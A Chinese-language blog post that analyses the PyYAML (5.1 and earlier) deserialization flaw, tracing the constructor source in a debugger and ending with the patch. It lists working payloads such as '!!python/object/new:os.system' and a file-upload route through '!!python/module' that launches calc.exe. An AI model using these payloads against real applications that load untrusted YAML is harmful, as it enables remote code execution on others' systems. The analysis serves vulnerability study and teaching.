<h2 id="漏洞成因rce">漏洞成因–RCE</h2>
<p>主要在PyYaml&lt;=5.1的版本下，默认<strong>Constructor</strong>为加载器，但是经过审计yaml模块中的Constructor.py的源码中存在对于python的标签解析时的漏洞。</p>
<p><a target="_blank" rel="noopener" href="http://xn--Constructor-km8qoeb784a8wr1o0exxutv1s.py">下面我们分析一下Constructor.py</a>，找一找在解析Python标签时的源码。</p>
<h3 id="pythonobject标签">!!python/object标签</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323173508853.png" alt="image-20240323173508853"></p>
<p>这里跟进yaml包之后如上图的函数，继续跟进，可以找到处理!!python/object标签的函数</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object</span>(<span class="hljs-params">self, suffix, node</span>):
    <span class="hljs-comment"># Format:</span>
    <span class="hljs-comment">#   !!python/object:module.name { ... state ... }</span>
    instance = self.make_python_instance(suffix, node, newobj=<span class="hljs-literal">True</span>)
    <span class="hljs-keyword">yield</span> instance
    deep = <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">'__setstate__'</span>)
    state = self.construct_mapping(node, deep=deep)
    self.set_python_instance_state(instance, state)</code></pre>
<h3 id="pythonobjectapply标签">!!python/object/apply标签</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174218701.png" alt="image-20240323174218701"></p>
<h3 id="pythonobjectnew标签">!!python/object/new标签</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174321497.png" alt="image-20240323174321497"></p>
<h3 id="pythonmodule标签">!!python/module标签</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174544420.png" alt="image-20240323174544420"></p>
<h3 id="pythonname标签">!!python/name标签</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174607818.png" alt="image-20240323174607818"></p>
<p>看上面前两个标签会发现都调用了make_python_instance()这个函数方法，所以我们接着往下看make_python_instance()</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_python_instance</span>(<span class="hljs-params">self, suffix, node,</span>
<span class="hljs-params">            args=<span class="hljs-literal">None</span>, kwds=<span class="hljs-literal">None</span>, newobj=<span class="hljs-literal">False</span>, unsafe=<span class="hljs-literal">False</span></span>): <span class="hljs-comment">#用于创建Python对象的实例</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args:
            args = [] <span class="hljs-comment">#对args进行空值处理，如果不存在，将args设置为空列表</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kwds:
            kwds = {} <span class="hljs-comment">#对kwds进行空值处理，如果不存在，将kwds设置为空字典</span>
        cls = self.find_python_name(suffix, node.start_mark)<span class="hljs-comment">#利用定义的find_python_name方法根据suffix字符串和node节点的起始标记查找Python对象的完整名称，然后获取该对象的类对象</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> i/sinstance(cls, <span class="hljs-built_in">type</span>)):
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python instance"</span>, node.start_mark,
                    <span class="hljs-string">"expected a class, but found %r"</span> % <span class="hljs-built_in">type</span>(cls),
                    node.start_mark)<span class="hljs-comment">#如果unsafe参数为False，并且获取的对象不是类对象，则抛出ConstructorError异常。</span>
        <span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):
            <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> cls(*args, **kwds)
        <span class="hljs-comment">#根据newobj参数的值，以及获取的类对象是否为类型对象，选择使用__new__方法或__init__方法创建Python对象实例，并将args和kwds参数传递给构造函数。如果newobj为True且获取的类对象是类型对象，则使用__new__方法创建实例；否则，使用__init__方法创建实例</span></code></pre>
<p>审计了一下make_python_instance()函数，可以发现，这里是通过args和kwds参数动态的创建Python对象的实例，所以，我们是可以利用这个特点进行执行我们的恶意代码，从而实现攻击。</p>
<p>我们可以发现在make_python_instance()中又调用了find_python_name()函数，接下来继续审计find_python_name()</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_python_name</span>(<span class="hljs-params">self, name, mark, unsafe=<span class="hljs-literal">False</span></span>):
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"expected non-empty name appended to the tag"</span>, mark) <span class="hljs-comment">#如果name为空，将会报错</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">'.'</span> <span class="hljs-keyword">in</span> name:
            module_name, object_name = name.rsplit(<span class="hljs-string">'.'</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">#如果name中包含"."，将会对name进行分割为模板名和对象名</span>
        <span class="hljs-keyword">else</span>:
            module_name = <span class="hljs-string">'builtins'</span>
            object_name = name <span class="hljs-comment">#如果name中没有"."，则会将模板名命名为"builtins"，对象名命名为"name"</span>
        <span class="hljs-keyword">if</span> unsafe:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-built_in">__import__</span>(module_name) <span class="hljs-comment">#unsafe默认为False，所以可以利用__import__将模块导入</span>
            <span class="hljs-keyword">except</span> ImportError <span class="hljs-keyword">as</span> exc:
                <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                        <span class="hljs-string">"cannot find module %r (%s)"</span> % (module_name, exc), mark) <span class="hljs-comment">#如果ImportError异常，将会报错</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> module_name <span class="hljs-keyword">in</span> sys.modules:
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"module %r is not imported"</span> % module_name, mark)<span class="hljs-comment">#如果模块不在sys.modules字典中，将会报错</span>
        module = sys.modules[module_name]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(module, object_name):
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"cannot find %r in the module %r"</span>
                    % (object_name, module.__name__), mark)<span class="hljs-comment">#使用hasattr()函数查该模块是否包含了指定的对象名，如果没有将报错</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, object_name)<span class="hljs-comment">#利用getattr()函数获取返回值</span></code></pre>
<p>通过审计find_python_name()，我们发现还可以通过引用module的类创建对象，从而执行我们的恶意代码，实现攻击。</p>
<p>在上述代码看完之后，我还是有很多不懂的点，因此就想着直接看最终payload去调试分析。</p>
<p>这里明确的是!!python/object标签并不能实现RCE，具体的下面分析，但我们先分析剩下的可以实现RCE的原因</p>
<p>先看!!python/object/apply标签和!!python/object/new标签（因为这两个标签的处理方法一样，就是newobj值不一样，我们看看最终是否会影响结果）</p>
<h4 id="调试分析1">调试分析1</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323181930329.png" alt="image-20240323181930329"></p>
<p>首先我们打一个端点，进入调试。步入之后，我们跟进get_single_data方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182001245.png" alt="image-20240323182001245"></p>
<p>继续跟进之后，我们来到下图位置，你也可以稍作尝试，会发现我们如果跟进construct_document方法的话，才是有趣的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182111649.png" alt="image-20240323182111649"></p>
<p>接下来就是无脑跟进，我们的重点就是观察其中参数值的变化，尤其是关注os.system与calc.exe分别在哪写参数上</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182238889.png" alt="image-20240323182238889"></p>
<p>如上图，我们会看到已经跟进到处理这两个标签的关键函数了，我们可以看一下各参数值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182352277.png" alt="image-20240323182352277"></p>
<p>如上图，这里的suffix为我们的os.system，也就是我们想要动态实例化的Python对象，我们现在可以回顾一下我们之前写的payload</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

payload = <span class="hljs-string">'!!python/object/apply:os.system ["calc.exe"]'</span>
yaml.load(payload, Loader=yaml.Loader)</code></pre>
<p>我们是搞了个键值对!!python/object/apply标签对应，这里我是觉得分析得不如GPT，因此我直接给GPT的回答了</p>
<pre><code class="hljs scss">重点分析给定的 `payload` 字符串 `'!!python/<span class="hljs-selector-tag">object</span>/apply:os.system [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'` 的组成和语法结构，进行详细解释如下：</span>
<span class="hljs-string"></span>
<span class="hljs-string">1. `'</span>!!python/object/apply:os.system<span class="hljs-string">'`：</span>
<span class="hljs-string">   - `!!` 是 YAML 的标签前缀，用于指定要应用的标签类型。</span>
<span class="hljs-string">   - `python/object/apply:os.system` 是标签值，指定了要使用的构造器函数和模块路径。在这里，`apply` 标签表示要应用一个函数，`os.system` 是函数的路径，表示要调用 `os` 模块中的 `system` 函数。</span>
<span class="hljs-string"></span>
<span class="hljs-string">2. `["calc.exe"]`：</span>
<span class="hljs-string">   - 这是一个包含单个元素 `"calc.exe"` 的列表。</span>
<span class="hljs-string">   - 这个列表是作为参数传递给构造器函数 `os.system` 的参数列表。</span>
<span class="hljs-string"></span>
<span class="hljs-string">综合起来，给定的 `payload` 表达了一个 YAML 数据结构，它使用特定的标签和参数列表来构造一个对象。具体地说，它使用 `apply` 标签来调用 `os.system` 函数，将 `"calc.exe"` 作为参数传递给该函数。</span>
<span class="hljs-string"></span>
<span class="hljs-string">需要注意的是，由于这个 `payload` 包含了敏感操作 `os.system("calc.exe")`，在实际使用中应谨慎处理，以避免安全风险。在加载和解析此类 YAML 数据时，应确保可信任的数据源和适当的安全措施。</span></code></pre>
<p>说白了，就是靠python/object/apply指定了构造器函数（也就是我们默认的constructor），然后想要去调用os.system函数，并传入calc这个参数。这样的话，我们再继续看上述跟进到的位置</p>
<p>suffix很明显了，就是被赋值为了os.system函数，没啥说的，接下来可以看一下node节点参数的内容</p>
<pre><code class="hljs scss">node=<span class="hljs-built_in">SequenceNode</span>(tag='tag:yaml.org,<span class="hljs-number">2002</span>:python/object/apply:os.system', value=[ScalarNode(tag='tag:yaml.org,<span class="hljs-number">2002</span>:str', value='calc.exe')])</code></pre>
<p>对于为何 node 参数是这样的内容，GPT是这样回答的</p>
<p>对于给定的 YAML 数据 <code>!!python/object/new:os.system ["calc.exe"]</code>，如果将其进行反序列化（即使用适当的 YAML 解析器进行加载），则其中的 <code>node</code> 节点将是一个包含以下内容的字典：</p>
<pre><code class="hljs python">{
    <span class="hljs-string">'__yaml_tag__'</span>: <span class="hljs-string">'tag:yaml.org,2002:python/object/apply:os.system'</span>,
    <span class="hljs-string">'__args__'</span>: [<span class="hljs-string">'calc.exe'</span>]
}</code></pre>
<p>在这里，<code>node</code> 是一个字典，其中包含两个键值对：</p>
<ul>
<li><code>'__yaml_tag__'</code> 键表示 YAML 标签，指示要实例化的对象类型。在这种情况下，标签为 <code>'tag:yaml.org,2002:python/object/new:os.system'</code>，表示要使用 <code>os.system</code> 类进行实例化。</li>
<li><code>'__args__'</code> 键表示传递给构造函数的参数列表。在此示例中，<code>['calc.exe']</code> 是作为参数传递给 <code>os.system</code> 构造函数的参数列表。</li>
</ul>
<p>通过加载该 YAML 数据并解析 <code>node</code> 节点，可以使用相应的构造器函数和参数来实例化 <code>os.system</code> 类对象。请注意，由于该 YAML 数据包含敏感操作 <code>os.system("calc.exe")</code>，在实际使用中应谨慎处理，以避免安全风险。</p>
<p>好，我们知道了上述参数的具体构成，接下来继续跟进，如果我们尝试过，就知道这里需要跟进一下construct_sequence来看看具体的函数逻辑</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183135875.png" alt="image-20240323183135875"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183218060.png" alt="image-20240323183218060"></p>
<p>如上图，跟进之后看到这个函数，首先判断node的类型是否是SequenceNode，如果不是，则报错；否则，通过for语句提取出node中的value值然后返回，而我们知道其中的value值有一个calc.exe，这很有趣，继续跟进。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183801409.png" alt="image-20240323183801409"></p>
<p>这里发现最终child的value值成了calc.exe</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183952814.png" alt="image-20240323183952814"></p>
<p>如上图，该函数在处理node的时候判断其是否是MappingNode实例，但根据值我们知道肯定不是，于是直接跳到return语句</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184103109.png" alt="image-20240323184103109"></p>
<p>上述return语句继续跟进函数的话，会到达上图，因为node是ScalarNode实例，于是他就直接返回node的value=calc.exe，但这里我有点懵，我想知道先前node的第一个value去哪了？？？所以我们重新调试一下看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184448506.png" alt="image-20240323184448506"></p>
<p>我们重新调试跟进到上方，突然就知道什么鬼了，之前就没注意，这里经过for循环将value给了child，但他的value是</p>
<pre><code class="hljs scss">value=<span class="hljs-selector-attr">[ScalarNode(tag=<span class="hljs-string">'tag:yaml.org,2002:str'</span>, value=<span class="hljs-string">'calc.exe'</span>)]</span>)</code></pre>
<p>当初我还以为是两个value，结果这里是value的嵌套。。。。继续跟进就顿悟了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184625946.png" alt="image-20240323184625946"></p>
<p>如上图，可以看到这里是将child参数值传入给了node，因此这里的node成了上面的值</p>
<p>所以在下图，我们的node也就是之前的child经过处理，又取得他的value值，也就是calc.exe</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184747589.png" alt="image-20240323184747589"></p>
<p>这里继续无脑跟进一波</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185058636.png" alt="image-20240323185058636"></p>
<p>到达make_python_instance函数，跟进到如下图，发现有调用了find_python_name函数，接续跟进~</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185156973.png" alt="image-20240323185156973"></p>
<p>继续跟进，如下图，这里的suffix的值赋给了name，node的start_mark给了mark</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185455281.png" alt="image-20240323185455281"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190158410.png" alt="image-20240323190158410"></p>
<p>继续跟进，发现对name做了针对处理，首先通过rsplit的.符号将name分隔开，然后通过import导入了os模块，随后判断模块是否在sys的模块中（但很显然是在的）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190713616.png" alt="image-20240323190713616"></p>
<p>最后通过getattr获取os模块里面的system方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190925079.png" alt="image-20240323190925079"></p>
<p>最后cls的值就是我们的os.system类，最后通过if语句的判断，来决定是通过new来实例化对象还是直接调用类的构造函数来实例化，显然其中的args是calc.exe，且最终是直接调用构造函数来实例化的，至于kwds为空</p>
<p>继续跟进就会发现弹出计算器了，至此分析完毕。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323191911886.png" alt="image-20240323191911886"></p>
<p>这里的isinstance函数是来判断cls是否为类对象，但我们最后的cls是os.system是一个函数，显然肯定不会进入if语句，由此可以知道为何apply与new标签的处理方法一致</p>
<h4 id="调试分析2">调试分析2</h4>
<p>这里可以分析剩下的三个标签了，如果你执行会发现没办法进行RCE，我们跟进看看为何</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

payload = <span class="hljs-string">'!!python/object:os.system ["calc.exe"]'</span>
yaml.load(payload, Loader=yaml.Loader)</code></pre>
<p>针对上面代码，我们继续调试跟进到下方，进入make_python函数看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323192750492.png" alt="image-20240323192750492"></p>
<p>进入该函数之前我认为可以与上述的apply、new标签对比一下就知道不同之处了，上述两个成功的标签对了一个对args参数的处理</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193432525.png" alt="image-20240323193432525"></p>
<p>如上图所示，这最终会导致args被赋值为calc.exe，但对于name、module标签来说，他们没有对args参数的处理，如果我们跟进会发现如下图的情况，会发现args被默认赋值为了none，导致最终的system没有参数传入，也就无法RCE</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193545793.png" alt="image-20240323193545793"></p>
<p>剩下的两个name与object标签都是这样的情况，不再赘述了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193704301.png" alt="image-20240323193704301"></p>
<p>至此全部分析完毕，最终能导致RCE的标签就只有apply、new标签，这里给几个常见payload</p>
<h3 id="payload总结">payload总结</h3>
<pre><code class="hljs scss">poc = '!!python/<span class="hljs-selector-tag">object</span>/new:os.system [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#给出一些相同用法的POC</span>
<span class="hljs-string">#poc = '</span>!!python/object/new:subprocess.check_output [[<span class="hljs-string">"calc.exe"</span>]]<span class="hljs-string">' </span>
<span class="hljs-string">#poc = '</span>!!python/object/new:os.popen [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#poc = '</span>!!python/object/new:subprocess.run [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#poc = '</span>!!python/object/new:subprocess.call [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#poc = '</span>!!python/object/new:subprocess.Popen [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#poc = """!!python/object/new:os.system</span>
<span class="hljs-string">          - calc.exe"""</span>
<span class="hljs-string">#poc = """</span>
<span class="hljs-string">!!python/object/new:os.system</span>
<span class="hljs-string">  args: ["calc.exe"]"""</span>
<span class="hljs-string">//这里将new与apply字符替换即可使用</span></code></pre>
<h2 id="漏洞成因文件上传">漏洞成因–文件上传</h2>
<h3 id="pythonmodule标签">!!python/module标签</h3>
<p>原理：利用现有文件上传或者写文件的功能，传入一个写入命令执行代码的文件；将文件名写入标签中，当该标签被反序列化时，就可以顺利导入该文件作为模块，执行当中的命令</p>
<p>文件名yaml_test.py</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> os
os.system(<span class="hljs-string">'calc.exe'</span>)</code></pre>
<p>如果在另一文件simple.py中，依次运行以下load代码</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml

yaml.load(<span class="hljs-string">"!!python/module:yaml_test"</span>)
<span class="hljs-comment">#exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对</span>
yaml.load(<span class="hljs-string">"!!python/object:yaml_test.exp"</span> )
yaml.load(<span class="hljs-string">"!!python/name:yaml_test.exp"</span> )</code></pre>
<p>都能成功弹出计算器</p>
<p>当然<code>!!python/object/new</code>和<code>!!python/object/apply</code>也可以用这种方式实现利用</p>
<pre><code class="hljs python">yaml.load(<span class="hljs-string">'!!python/object/apply:yaml_test.exp {}'</span> )
yaml.load(<span class="hljs-string">'!!python/object/new:yaml_test.exp {}'</span> )</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323195256661.png" alt="image-20240323195256661"></p>
<p>如果我们调试分析就知道最终的name会被赋值为yaml_text，而被import导入，导入之后，其中的代码也会被执行，进而弹出计算器</p>
<p>以上要求是在同一目录下，如果不在同一目录下怎么办，好比如这种情况</p>
<pre><code class="hljs css">├── simple<span class="hljs-selector-class">.py</span>
└── uploads
    └── yaml_test<span class="hljs-selector-class">.py</span></code></pre>
<p>那payload稍作修改，在文件名前加入目录名可</p>
<pre><code class="hljs python"><span class="hljs-comment">#经过测试只有modle标签可行</span>
yaml.load(<span class="hljs-string">"!!python/module:uploads.yaml_test"</span> )</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200529942.png" alt="image-20240323200529942"></p>
<p>这里只要调试一下就知道问题出在哪里，在module与name的标签处理中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200802243.png" alt="image-20240323200802243"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200939494.png" alt="image-20240323200939494"></p>
<p>对于find_python对应函数的处理中，module标签没有经过rsplit函数的处理，而name经过了</p>
<p>当然文件名写成<code>__init__.py</code>将会更简单，payload只需目录即可，而且apply和new两个标签也可以构造利用了</p>
<pre><code class="hljs scss">yaml<span class="hljs-selector-class">.load</span>("!!python/module:uploads" )
<span class="hljs-selector-id">#exp</span>表示着类实例，可以写成其他，虽不存在但是一定要有，否则报错
yaml<span class="hljs-selector-class">.load</span>('!!python/object/apply:uploads.exp {}' )
yaml<span class="hljs-selector-class">.load</span>('!!python/object/new:uploads.exp {}' )</code></pre>
<h2 id="漏洞修复">漏洞修复</h2>
<p>大于5.1的版本，打了补丁（这里懒得找了，就直接cv文章）</p>
<p>通过调试发现，find_python_name方法（还有find_python_mdule方法也一样）增加了一个默认unsafe为false的值</p>
<p>就无法直接<code>__import__</code>，最终会报错</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_python_name</span>(<span class="hljs-params">self, name, mark, unsafe=<span class="hljs-literal">False</span></span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"expected non-empty name appended to the tag"</span>, mark)
        <span class="hljs-keyword">if</span> <span class="hljs-string">u'.'</span> <span class="hljs-keyword">in</span> name:
            module_name, object_name = name.rsplit(<span class="hljs-string">'.'</span>, <span class="hljs-number">1</span>)
        <span class="hljs-keyword">else</span>:
            module_name = <span class="hljs-string">'__builtin__'</span>
            object_name = name
        <span class="hljs-keyword">if</span> unsafe:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-built_in">__import__</span>(module_name)
            <span class="hljs-keyword">except</span> ImportError, exc:
                <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                        <span class="hljs-string">"cannot find module %r (%s)"</span> % (module_name.encode(<span class="hljs-string">'utf-8'</span>), exc), mark)
